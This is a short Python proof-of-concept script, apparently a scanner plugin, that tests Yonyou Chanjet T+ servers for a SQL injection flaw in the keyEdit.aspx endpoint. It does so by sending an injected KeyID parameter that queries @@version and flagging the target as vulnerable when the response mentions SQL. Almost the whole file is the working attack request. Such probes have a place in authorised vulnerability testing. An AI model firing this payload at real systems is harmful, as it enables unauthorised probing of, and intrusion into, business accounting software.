import requests
import urllib

def verify(url):
    relsult = {
        'name': '用友畅捷通TPlus-keyEdit.aspx接口存在SQL注入漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Connection': 'close',
        'Accept-Charset': 'utf-8'
    }
    vurl = urllib.parse.urljoin(url, "/tplus/UFAQD/keyEdit.aspx?KeyID=1%27%20and%201=(select%20@@version)%20--&preload=1")
    try:
        response = requests.get(vurl, headers=headers)
        if response.status_code == 200 and 'SQL' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult